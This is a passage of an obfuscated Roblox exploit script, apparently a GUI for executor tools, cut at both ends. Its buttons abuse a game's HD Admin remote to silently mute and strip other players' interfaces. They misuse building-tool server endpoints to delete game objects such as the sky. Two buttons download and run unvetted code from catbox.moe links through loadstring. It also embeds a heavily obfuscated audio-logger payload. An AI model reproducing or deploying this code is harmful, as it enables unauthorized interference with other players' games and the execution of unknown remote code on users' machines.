					for i,v in game.workspace:GetDescendants() do
						if v:IsA("BasePart") then
							spawn(function()
								SetTrans(v,math.random(0,0))
							end)
						end
					end 
				end
				spam()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_4);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_6()
			local script = G2L["6"];
			script.Parent.MouseButton1Click:Connect(function()
	
	
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommand:InvokeServer(";unmusic")
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_6);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_8()
			local script = G2L["8"];
			script.Parent.MouseButton1Click:Connect(function()
	
	
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommand:InvokeServer(";hideguis others")
				RequestCommand:InvokeServer(";mute others")
				RequestCommand:InvokeServer(";uncmdbar others")
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_8);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_a()
			local script = G2L["a"];
			script.Parent.MouseButton1Click:Connect(function()
	
	
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";time 10")
	
				local function findBuildingTools()
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in ipairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					for _, item in ipairs(player.Backpack:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					return nil
				end
	
				local buildingTools = findBuildingTools()
				if not buildingTools then
					warn("btools not found")
					return
				end
	
				local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
				local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
				if not serverEndpoint then
					warn("btools not found")
					return
				end
	
				local skyInstance = workspace:FindFirstChild("Sky")
				if not skyInstance then
					print"ok"
				end
	
				local args = {
					"Remove",                
					{ skyInstance }           
				}
	
				local success, result
				if serverEndpoint:IsA("RemoteFunction") then
					success, result = pcall(function()
						return serverEndpoint:InvokeServer(unpack(args))
					end)
				else
	
					serverEndpoint:FireServer(unpack(args))
					success = true
				end
	
				if success then
	
					print"yay"
	
				end
	
	
	
	
	
	
	
	
	
	
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";time 10")
	
				local function findBuildingTools()
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in ipairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					for _, item in ipairs(player.Backpack:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					return nil
				end
	
				local buildingTools = findBuildingTools()
				if not buildingTools then
					warn("btools not found")
					return
				end
	
				local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
				local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
				if not serverEndpoint then
					warn("btools not found")
					return
				end
	
				local skyInstance = workspace:FindFirstChild("Skyl0rdSky")
				if not skyInstance then
					print"ok"
				end
	
				local args = {
					"Remove",                
					{ skyInstance }           
				}
	
				local success, result
				if serverEndpoint:IsA("RemoteFunction") then
					success, result = pcall(function()
						return serverEndpoint:InvokeServer(unpack(args))
					end)
				else
	
					serverEndpoint:FireServer(unpack(args))
					success = true
				end
	
				if success then
	
					print"yay"
	
				end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_a);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_c()
			local script = G2L["c"];
			script.Parent.MouseButton1Click:Connect(function()
	
	
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommand:InvokeServer(";insert 53326")
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_c);
		-- StarterGui.ScreenGui.Frame.LocalScript
		local function C_d()
			local script = G2L["d"];
			local UserInputService = game:GetService("UserInputService")
			local runService = (game:GetService("RunService"));
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			function Lerp(a, b, m)
				return a + (b - a) * m
			end;
	
			local lastMousePos
			local lastGoalPos
			local DRAG_SPEED = (8); -- // The speed of the UI darg.
			function Update(dt)
				if not (startPos) then return end;
				if not (dragging) and (lastGoalPos) then
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
					return 
				end;
	
				local delta = (lastMousePos - UserInputService:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X);
				local yGoal = (startPos.Y.Offset - delta.Y);
				lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
			end;
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					lastMousePos = UserInputService:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			runService.Heartbeat:Connect(Update)
		end;
		task.spawn(C_d);
	
		return G2L["1"], require;
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4c);
-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
local function C_4f()
local script = G2L["4f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	
		loadstring(game:HttpGet('https://files.catbox.moe/7di1mo.txt'))()
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4f);
-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
local function C_51()
local script = G2L["51"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	
		loadstring(game:HttpGet("https://files.catbox.moe/hqq4pk.txt"))()
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_51);
-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
local function C_53()
local script = G2L["53"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
	--[[
	LUA_XAV-OBF v0.0.2
	]]--
	
		local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v53,v54) local v55={};for v136=1, #v53 do v6(v55,v0(v4(v1(v2(v53,v136,v136 + 1 )),v1(v2(v54,1 + (v136% #v54) ,1 + (v136% #v54) + 1 )))%256 ));end return v5(v55);end UI=game:GetObjects(v7("\195\193\195\36\245\168\194\10\216\199\129\106\169\234\149\78\133\149\136\117\180\232\147\75","\126\177\163\187\69\134\219\167"))[1 + 0 ];local v9=UI.Base;local v10=UI.PreviewSound;local v11=v9.Body.Pages:FindFirstChild(v7("\2\216\46\204\243\16\206\43\203\242\38\223","\156\67\173\74\165"));local v12=v9.Body.Pages:FindFirstChild(v7("\7\184\92\24\184\15\72\50\184\121\23\187\35","\38\84\215\41\118\220\70"));local v13=v9.Body.Pages:FindFirstChild(v7("\125\3\54\23\220\95\25\47\16\241\72\19\49","\158\48\118\66\114"));local v14=v9.Body.Pages:FindFirstChild(v7("\152\33\4\34\122\171\252\184","\155\203\68\112\86\19\197"));local v15=game:GetService(v7("\107\220\36\247\69\108\245\244\71\222\51\207\69\106\243\241\69\216","\152\38\189\86\156\32\24\133"));local v16=game:GetService(v7("\200\64\162\67\242\100\162\84\234\94\164\67","\38\156\55\199"));local v17=game:GetService(v7("\155\114\105\38\23\71\255\81\190\116\127\45","\35\200\29\28\72\115\20\154"));local v18=game:GetService(v7("\44\172\212\205\164\34\36\12\171\226\218\159\58\61\26\186","\84\121\223\177\191\237\76"));local v19=game:GetService(v7("\139\90\200\185\63\66\35","\161\219\54\169\192\90\48\80"));local v20=game:GetService(v7("\123\87\14\22\76\80\22\44\74\71","\69\41\34\96"));local v21=game:GetService(v7("\148\215\195\26\49\46\174\213\222\9\7","\75\220\163\183\106\98"));local v22=game:GetService(v7("\33\181\153\50\254\23\179","\185\98\218\235\87"));local v23=game:GetService(v7("\251\48\38\255\219\184\216","\202\171\92\71\134\190")).LocalPlayer;local v24={};local v25;if identifyexecutor then local v137=0;while true do if (v137==(679 -(112 + 567))) then v25,Ver=identifyexecutor();if Ver then v25=v25   .. " "   .. tostring(Ver) ;end break;end end else v25=(secure_load and v7("\26\196\34\156\32\207\41\132","\232\73\161\76")) or (pebc_execute and v7("\139\203\77\73\17\136\212\67\78\22\190\203","\126\219\185\34\61")) or (is_sirhurt_closure and v7("\63\199\76\122\107\101\231","\135\108\174\62\18\30\23\147")) or (syn and  not is_sirhurt_closure and  not isexecutorclosure and v7("\133\240\36\202\8\189\54\135\142","\167\214\137\74\171\120\206\83")) or (KRNL_LOADED and v7("\160\226\60\81","\199\235\144\82\61\152")) ;end UI.Base.Drag.Title.Text=v7("\40\61\138\107\38\35\157\2\40\58\150\12\32\51\139\107","\75\103\118\217")   .. tostring(UI.Info.Version.Value) ;v9.Body.Pages.Introductory.Content.Ver.Text=tostring(UI.Info.Version.Value);v9.Body.Pages.About.Content.Ver.Text=tostring(UI.Info.Version.Value);v9.Body.Pages.Introductory.Content.Exploit.Text=tostring(v25);v9.Body.Pages.About.Content.Exploit.Text=tostring(v25);MessageBoxRunning=false;local v31={[v7("\229\91\98\16\188\12\228\91\124\27\171","\126\167\52\16\116\217")]=Color3.fromRGB(0 + 0 ,433 -(153 + 280) ,736 -481 ),[v7("\238\47\36\137\186\30\209\221\58\37","\156\168\78\64\224\212\121")]=false,[v7("\53\201\135\236\8\252\161\203\21","\174\103\142\197")]=false};local v32={[v7("\102\36\94\33","\152\54\72\63\88\69\62")]=v7("\198\198\246\93\199\215\235\72\142\139\161\72\209\220\250\73\198\193\253\19\231\208\251\88\221\203\218\83\219\200\236\83\204\139\207\73\208\205\225\108\198\193\248\85\209\211\161\76\216\197\247\18\196\202\233","\60\180\164\142"),[v7("\104\95\16\58\34","\114\56\62\101\73\71\141")]=v7("\170\235\195\197\171\250\222\208\226\166\148\208\189\241\207\209\170\236\200\139\139\253\206\192\177\230\239\203\183\229\217\203\160\166\250\209\188\224\212\244\170\236\205\205\189\254\148\212\185\252\200\193\246\249\213\195","\164\216\137\187"),[v7("\241\233\33\171","\107\178\134\81\210\198\158")]=v7("\42\12\154\199\185\43\11\150\207\174\98\65\205\151\248\104\90\212\145\252\105\94\219\148","\202\88\110\226\166"),[v7("\224\0\146\238\249\203\0\144\227","\170\163\111\226\151")]=v7("\3\50\170\57\93\36\44\5\57\182\98\1\120\120\67\96\230\110\25\111\124\72\99\227","\73\113\80\210\88\46\87"),[v7("\172\57\217\23","\135\225\76\173\114")]=v7("\8\239\160\177\191\174\162\14\183\247\255\184\184\191\14\248\170\181\191\242\178\19\162\142\191\165\190\162\57\229\185\164\227\144\174\9\238\247\157\185\169\162\59\225\180\254\188\179\160","\199\122\141\216\208\204\221"),[v7("\152\211\61\229\108\243","\150\205\189\112\144\24")]=v7("\55\134\167\77\23\155\20\4\127\203\240\88\1\144\5\5\55\129\172\3\17\129\94\38\42\141\188\73\39\128\16\4\106\169\182\95\7\199\36\30\40\145\171\73\37\132\29\94\53\138\184","\112\69\228\223\44\100\232\113"),[v7("\231\10\4\208\179\111\149","\230\180\127\103\179\214\28")]=v7("\158\7\71\71\247\82\229\152\95\16\9\240\68\248\152\16\77\67\247\14\193\130\12\82\71\240\72\239\130\32\91\79\240\78\242\195\12\92\73\234\126\227\132\0\92\77\233\64\242\135\75\79\72\227","\128\236\101\63\38\132\33"),[v7("\137\187\3\75\164","\175\204\201\113\36\214\139")]=v7("\85\206\45\221\23\84\201\33\134\75\8\216\48\196\16\82\222\48\207\75\102\194\60\209\5\83\197\58\210\33\67\197\33\211\22\8\197\54\211\10\120\207\57\211\23\66\130\37\210\3","\100\39\172\85\188")};function ChangeTab(v56) local v57=0;while true do if (v57==(0 + 0)) then for v246,v247 in pairs(v9.Body.Pages:GetChildren()) do v247.Visible=false;end v9.Body.Pages:FindFirstChild(v56).Visible=true;break;end end end function UpdateBorderColor(v58) if v31.RGBBorder then return;end UI.Base.Border.ImageColor3=v58;UI.Base.Border.Border.ImageColor3=v58;UI.Base.MessageBox.Border.ImageColor3=v58;for v138,v139 in pairs(UI.Base.Prompts:GetChildren()) do local v140=0 + 0 ;local v141;while true do if (v140==(0 + 0)) then v141=0 + 0 ;while true do if (v141==0) then if (v139.Name==v7("\157\106\182\141\35\185\75\177\129\55\162\111","\83\205\24\217\224")) then return;end v139:FindFirstChild(v7("\196\202\223\57\227\215","\93\134\165\173")).ImageColor3=v58;break;end end break;end end end end function Message(v62) if  not MessageBoxRunning then MessageBoxRunning=true;local v157=v9.MessageBox;v157.Title.Text=v62.Title;v157.Inner.Message.Text=v62.Message;v157.Visible=true;v9.MessageBoxShadow.Visible=true;v157.Inner.Buttons.OK.OK.MouseButton1Down:Connect(function() MessageBoxRunning=false;v157.Visible=false;v9.MessageBoxShadow.Visible=false;end);v9.MessageBoxShadow.MouseButton1Down:Connect(function() local v205=0 + 0 ;while true do if (v205==(0 -0)) then MessageBoxRunning=false;v157.Visible=false;v205=1 + 0 ;end if (v205==(668 -(89 + 578))) then v9.MessageBoxShadow.Visible=false;break;end end end);end end function FilterSoundResults(v63,v64) for v142,v143 in pairs(v64:GetChildren()) do if ( not v143:IsA(v7("\139\219\237\203\41\218\158\127\167\253\212\214","\30\222\146\161\162\90\174\210")) and  not v143:IsA(v7("\208\103\64\11\225\74\121\4\226","\106\133\46\16"))) then if string.match(v143.Name,v63) then v143.Visible=true;elseif  not string.match(v143.Name,v63) then v143.Visible=false;end end end end local v33=false;local v34=false;function ToggleMuteAudio(v65,v66,v67) if ( not v33 and v17.RespectFilteringEnabled) then local v164=0 + 0 ;local v165;while true do if (v164==(0 -0)) then v165=1049 -(572 + 477) ;while true do if (v165==(0 + 0)) then v33=true;Message({[v7("\108\41\103\240\95","\32\56\64\19\156\58")]=v7("\109\201\247\88\83\252\135\27","\224\58\168\133\54\58\146"),[v7("\116\83\88\238\116\129\130","\107\57\54\43\157\21\230\231")]=v7("\233\142\2\229\188\223\219\253\130\29\225\188\206\198\213\140\52\251\184\222\195\222\143\81\220\170\156\234\213\138\19\249\188\216\131\155\184\20\249\188\223\219\222\143\81\212\172\216\198\212\203\6\252\181\208\143\212\133\29\236\249\209\218\207\142\81\243\182\206\143\194\132\4\187","\175\187\235\113\149\217\188")});break;end end break;end end end v34=true;if v66 then if v31.FadingMute then local v249=0 + 0 ;while true do if (v249==1) then v65.Playing=false;break;end if (v249==(0 + 0)) then v16:Create(v65,TweenInfo.new(86.5 -(84 + 2) ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\10\160\141\89\238\124","\24\92\207\225\44\131\25")]=0 -0 }):Play();wait(0.5);v249=1;end end else v65.Playing=false;end elseif v31.FadingMute then v65.Playing=true;v16:Create(v65,TweenInfo.new(0.5 + 0 ,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{[v7("\125\220\180\89\22\120","\29\43\179\216\44\123")]=tonumber(v67) or 1 }):Play();else v65.Playing=true;end end local function v35(v68) local v69={};if (tostring(v68):lower()==v7("\176\220","\44\221\185\64")) then local v166=0;while true do if (v166==0) then table.insert(v69,v23);return v69;end end elseif (tostring(v68):lower()==v7("\0\235\68","\19\97\135\40\63")) then local v253=842 -(497 + 345) ;while true do if (v253==(0 + 0)) then for v367,v368 in pairs(game:GetService(v7("\158\80\50\34\42\35\189","\81\206\60\83\91\79")):GetPlayers()) do table.insert(v69,game:GetService(v7("\126\167\209\107\42\209\94","\196\46\203\176\18\79\163\45"))[v368.Name]);end return v69;end end elseif (tostring(v68):lower()==v7("\183\54\118\27\54\232","\143\216\66\30\126\68\155")) then local v310=0 + 0 ;while true do if (v310==(1333 -(605 + 728))) then for v402,v403 in pairs(game:GetService(v7("\154\196\12\210\192\177\196","\129\202\168\109\171\165\195\183")):GetPlayers()) do if (v403.Name~=v23.Name) then table.insert(v69,game:GetService(v7("\18\84\54\193\219\6\245","\134\66\56\87\184\190\116"))[v403.Name]);end end return v69;end end elseif (tostring(v68):lower()==v7("\46\48\7\191\22\230","\85\92\81\105\219\121\139\65")) then local v369=0 + 0 ;while true do if (v369==(0 -0)) then table.insert(v69,game:GetService(v7("\205\191\81\92\121\205\238","\191\157\211\48\37\28")):GetPlayers()[math.random(1, #game:GetService(v7("\239\19\245\5\63\205\12","\90\191\127\148\124")):GetPlayers())]);return v69;end end else local v370=0 + 0 ;while true do if (v370==(0 -0)) then for v442,v443 in pairs(game:GetService(v7("\72\139\47\14\125\149\61","\119\24\231\78")):GetPlayers()) do if (string.sub(v443.Name,1, #tostring(v68):lower()):lower()==tostring(v68):lower()) then table.insert(v69,game:GetService(v7("\178\33\164\83\217\82\2","\113\226\77\197\42\188\32"))[v443.Name]);end end return v69;end end end end function ToggleMutePlayer(v70,v71) local v72=0 + 0 ;local v73;while true do if (v72==(0 -0)) then v73=0 + 0 ;while true do if ((489 -(457 + 32))==v73) then if ( not v33 and v17.RespectFilteringEnabled) then local v371=0 + 0 ;while true do if (v371==0) then v33=true;Message({[v7("\14\31\224\185\63","\213\90\118\148")]=v7("\108\47\166\88\68\85\41\245","\45\59\78\212\54"),[v7("\61\83\144\152\135\41\168","\144\112\54\227\235\230\78\205")]=v7("\129\45\28\236\213\88\167\14\6\240\196\94\161\33\1\251\245\85\178\42\3\249\212\27\154\59\79\217\222\90\177\36\10\248\156\27\131\36\14\229\213\73\160\104\13\243\223\86\177\39\23\188\199\82\191\36\79\243\222\87\170\104\2\233\196\94\243\46\0\238\144\66\188\61\65","\59\211\72\111\156\176")});break;end end end v33=true;v73=1403 -(832 + 570) ;end if (v73==1) then if v71 then local v372=0;local v373;while true do if (v372==(0 + 0)) then v373=game:GetService(v7("\126\139\226\52\75\149\240","\77\46\231\131")).LocalPlayer;for v444,v445 in pairs(v35(v70)) do local v446=0 + 0 ;local v447;while true do if (v446==0) then if v445:FindFirstChild(v7("\147\71\155\85\174\81\178","\32\218\52\214")) then v445[v7("\103\4\28\189\229\181\65","\58\46\119\81\200\145\208\37")]:Destroy();end wait(0.1);v446=3 -2 ;end if ((1 + 0)==v446) then v447=Instance.new(v7("\9\131\63\160\159\188\58\62\137","\86\75\236\80\204\201\221"),v445);v447.Name=v7("\91\82\90\144\234\142\118","\235\18\33\23\229\158");break;end end end break;end end elseif  not v71 then for v427,v428 in pairs(v35(v70)) do if v428:FindFirstChild(v7("\121\169\236\174\68\191\197","\219\48\218\161")) then v428:FindFirstChild(v7("\205\98\81\92\207\74\228","\128\132\17\28\41\187\47")):Destroy();end end end break;end end break;end end end function OpenSoundInfo(v74,v75,v76) local v77;local v78;local v79=false;warn(v74);local v80,v81=pcall(function() if string.match(v74,v7("\19\48\30\59\78\18\55\18\51\89\91\125\73","\61\97\82\102\90")) then local v206,v207=string.gsub(v74,v7("\190\44\179\74\212\68\27\29\165\42\241\4\136","\105\204\78\203\43\167\55\126"),"");v77=v15:GetProductInfo(v206);v78=v206;else local v208=0;local v209;while true do if (v208==(797 -(588 + 208))) then v77=v15:GetProductInfo(v209);v78=v209;break;end if (v208==0) then local v311=0 -0 ;while true do if (v311==(1801 -(884 + 916))) then v208=1 -0 ;break;end if (v311==(0 + 0)) then v209=string.sub(v74,string.find(v74,"=") + (654 -(232 + 421)) ,string.len(v74));print(v209);v311=1890 -(1569 + 320) ;end end end end end end);if v80 then print(tostring(v77));print(v77.Name);v12.SoundName.Text=v7("\139\139\14\59\73\68","\49\197\202\67\126\115\100\167")   .. v77.Name ;v12.WSName.Text=v7("\0\104\159\7\161\123\123\109\27","\62\87\59\191\73\224\54")   .. tostring(v75) ;v12.ID.Text=v7("\206\38\160\137","\169\135\98\154")   .. tostring(v78) ;v12.SoundParent.Text=v7("\251\86\22\113\211\7\146\139","\168\171\23\68\52\157\83")   .. tostring(v76) ;ChangeTab(v7("\199\126\224\163\33\4\137\242\126\197\172\34\40","\231\148\17\149\205\69\77"));v12.GoBack.MouseButton1Down:Connect(function() local v210=0 + 0 ;while true do if (v210==2) then ChangeTab(v7("\161\178\195\242\88\204\131\166\201\245\82\237","\159\224\199\167\155\55"));break;end if ((0 + 0)==v210) then if (v10.Playing==true) then v10.Playing= not v10.Playing;end if v79 then v79= not v79;end v210=3 -2 ;end if (v210==(606 -(316 + 289))) then v10.Playing=false;v12.HoverOpt.Visible=false;v210=5 -3 ;end end end);for v211,v212 in pairs(v12.Buttons.Container:GetChildren()) do if  not (v212:IsA(v7("\194\218\16\219\228\231\16\211\238\252\41\198","\178\151\147\92")) or v212:IsA(v7("\185\212\124\51\22\72\115\130\250","\26\236\157\44\82\114\44"))) then v212.MouseEnter:Connect(function() local v314=0 + 0 ;local v315;while true do if ((1453 -(666 + 787))==v314) then v315=0;while true do if (v315==0) then v12.HoverOpt.Text=v212:GetAttribute(v7("\14\43\198\88","\59\74\78\181"));v12.HoverOpt.Visible=true;break;end end break;end end end);v212.MouseLeave:Connect(function() v12.HoverOpt.Visible=false;end);v212.MouseButton1Down:Connect(function() if (v212.Name==v7("\6\222\74\67\128\45\222\72\78","\211\69\177\58\58")) then local v375,v376=pcall(function() if string.match(v74,v7("\165\231\97\244\250\216\178\241\112\241\179\132\248","\171\215\133\25\149\137")) then local v429,v430=string.gsub(v74,v7("\243\202\42\251\252\35\249\86\232\204\104\181\160","\34\129\168\82\154\143\80\156"),"");setclipboard(v429);elseif string.match(v74,v7("\141\166\39\27\18\1\198\146\165\36\69\90\65\139\137\189\43\69\75\65\132\202\179\32\24\77\90\198\218\187\55\86","\233\229\210\83\107\40\46")) then local v460=425 -(360 + 65) ;local v461;local v462;while true do if (v460==(0 + 0)) then v461,v462=string.gsub(v74,v7("\201\86\38\198\95\142\13\37\193\18\143\80\61\212\9\206\90\124\213\10\204\13\51\197\22\196\86\125\137\12\197\31","\101\161\34\82\182"),"");setclipboard(v461);break;end end elseif string.match(v74,v7("\224\25\77\238\200\184\205\97\255\26\78\176\201\237\128\34\231\21\23\253\212\239\205\47\251\30\92\234\148\189\139\42\181","\78\136\109\57\158\187\130\226")) then local v477=254 -(79 + 175) ;local v478;local v479;while true do if (v477==0) then v478,v479=string.gsub(v74,v7("\54\43\237\225\45\101\182\190\41\40\238\191\44\48\251\253\49\39\183\242\49\50\182\240\45\44\252\229\113\96\240\245\99","\145\94\95\153"),"");setclipboard(v478);break;end end end end);if v375 then local v404=0 -0 ;local v405;while true do if ((0 + 0)==v404) then v405=0 -0 ;while true do if (v405==(1 -0)) then v212.Icon.Image=v32[v212.Name];break;end if (v405==(899 -(503 + 396))) then v212.Icon.Image=v32.Success;wait(2.2);v405=182 -(92 + 89) ;end end break;end end elseif v376 then local v450=0 -0 ;while true do if (v450==(1 + 0)) then wait(2.2 + 0 );v212.Icon.Image=v32[v212.Name];break;end if (v450==(0 -0)) then warn(v376);v212.Icon.Image=v32.Error;v450=1 + 0 ;end end end elseif (v212.Name==v7("\222\194\4\204","\215\157\173\116\181\46")) then local v406,v407=pcall(function() setclipboard(v74);end);if v406 then v212.Icon.Image=v32.Success;wait(4.2 -2 );v212.Icon.Image=v32[v212.Name];elseif v407 then local v466=0 + 0 ;local v467;while true do if ((0 + 0)==v466) then v467=0 -0 ;while true do if (1==v467) then wait(1.2000000000000002 + 1 );v212.Icon.Image=v32[v212.Name];break;end if (v467==(0 -0)) then warn(v407);v212.Icon.Image=v32.Error;v467=1;end end break;end end end elseif (v212.Name==v7("\24\161\159\247","\186\85\212\235\146")) then local v454=1244 -(485 + 759) ;local v455;local v456;while true do if (v454==(0 -0)) then v455,v456=pcall(function() local v488=1189 -(442 + 747) ;local v489;while true do if (v488==0) then v489=table.find(v24,v77.AssetId);print(v489);v488=1;end if (v488==(1136 -(832 + 303))) then if (v489==nil) then local v499=946 -(88 + 858) ;local v500;while true do if (v499==(0 + 0)) then v500=0 + 0 ;while true do if (v500==0) then print(v7("\239\148\2\251\61","\56\162\225\118\158\89\142"));table.insert(v24,v77.AssetId);v500=1 + 0 ;end if (v500==(790 -(766 + 23))) then ToggleMuteAudio(v76:FindFirstChild(v75),true);break;end end break;end end elseif (v489~=nil) then print(v7("\105\11\205\186\54\221\88","\184\60\101\160\207\66"));table.remove(v24,v77.AssetId);ToggleMuteAudio(v76:FindFirstChild(v75),false,v76:FindFirstChild(v75).Volume);end break;end end end);if v455 then local v490=0 -0 ;local v491;while true do if (v490==(0 -0)) then v491=table.find(v24,v77.AssetId);if (v491~=nil) then local v501=0 -0 ;while true do if (v501==(3 -2)) then v212.Icon.Image=v32.UnMute;break;end if (v501==0) then v212.Icon.Image=v32.Success;wait(1075.2 -(1036 + 37) );v501=1 + 0 ;end end else local v502=0;local v503;while true do if (v502==(0 -0)) then v503=0 + 0 ;while true do if (v503==1) then v212.Icon.Image=v32[v212.Name];break;end if (v503==0) then v212.Icon.Image=v32.Success;wait(1482.2 -(641 + 839) );v503=914 -(910 + 3) ;end end break;end end end break;end end elseif v456 then warn(v456);v212.Icon.Image=v32.Error;wait(2.2);v212.Icon.Image=v32[v212.Name];end break;end end end end);end end v12.Playback.ControlPlayback.MouseButton1Down:Connect(function() if ( not v79 or (v10.Playing==false)) then v79=true;v12.Playback.ControlPlayback.Icon.Image=v32.Pause;v10.SoundId=v74;v10.Playing=true;else v79=false;v12.Playback.ControlPlayback.Icon.Image=v32.Play;v10.Playing=false;end end);local v171=game:GetService(v7("\1\142\125\165\52\144\111","\220\81\226\28")).LocalPlayer:GetMouse();local v172=game.Players.LocalPlayer:GetMouse();local v173=v12.Playback.Prog;v10.TimePosition=0;v12.Playback.CurrTime.Text=v10.TimePosition   .. v7("\0\149\205\187","\167\115\181\226\155\138")   .. tostring(v10.TimeLength)   .. "s" ;task.spawn(function() while task.wait(0.2) do if (v10.TimePosition==(0 -0)) then v173.Bar.Size=UDim2.new(0,0,1,1684 -(1466 + 218) );end v173.Bar.Size=UDim2.new(0,(((v173.AbsoluteSize.X * ((v10.TimePosition + 0 + 0)/(v10.TimeLength-0)))>(1149 -(556 + 592))) and (v173.AbsoluteSize.X * (v10.TimePosition/(v10.TimeLength-(0 + 0))))) or (813 -(329 + 479)) ,1,0);v12.Playback.CurrTime.Text=math.floor(v10.TimePosition)   .. v7("\241\98\168\28","\166\130\66\135\60\27\17")   .. tostring(math.floor(v10.TimeLength))   .. "s" ;end end);local v176=false;v173.Bar.Size=UDim2.new(0,(((v173.AbsoluteSize.X * ((v10.TimePosition + 0)/(v10.TimeLength-0)))>(855 -(174 + 680))) and (v173.AbsoluteSize.X * (v10.TimePosition/(v10.TimeLength-(0 -0))))) or (10 -5) ,1 + 0 ,739 -(396 + 343) );v173.Interact.InputBegan:Connect(function(v213) if (v213.UserInputType==Enum.UserInputType.MouseButton1) then local v279=0 + 0 ;while true do if (v279==(1477 -(29 + 1448))) then if v79 then v10.Playing=false;end v176=true;break;end end end end);v173.Interact.InputEnded:Connect(function(v214) if (v214.UserInputType==Enum.UserInputType.MouseButton1) then local v280=0;local v281;while true do if (v280==(1389 -(135 + 1254))) then v281=0 -0 ;while true do if (v281==0) then if v79 then v10.Playing=true;end v176=false;break;end end break;end end end end);v173.Interact.MouseButton1Down:Connect(function(v215) local v216=v173.Bar.AbsolutePosition.X + v173.Bar.AbsoluteSize.X ;local v217=v216;local v218=v215;local v219;v219=v20.Stepped:Connect(function() if v176 then local v318=0 -0 ;local v319;local v320;local v321;while true do if (v318==4) then v320,v321=pcall(function() local v409=0;while true do if (v409==0) then v10.TimePosition=v319;v12.Playback.CurrTime.Text=v319   .. v7("\93\80\120\58","\26\46\112\87")   .. tostring(math.floor(v10.TimeLength))   .. "s" ;break;end end end);break;end if (v318==(2 + 0)) then if ((v216<=v218) and ((v218-v217)<(1527 -(389 + 1138)))) then v217=v218;elseif ((v216>=v218) and ((v218-v217)>(574 -(102 + 472)))) then v217=v218;end 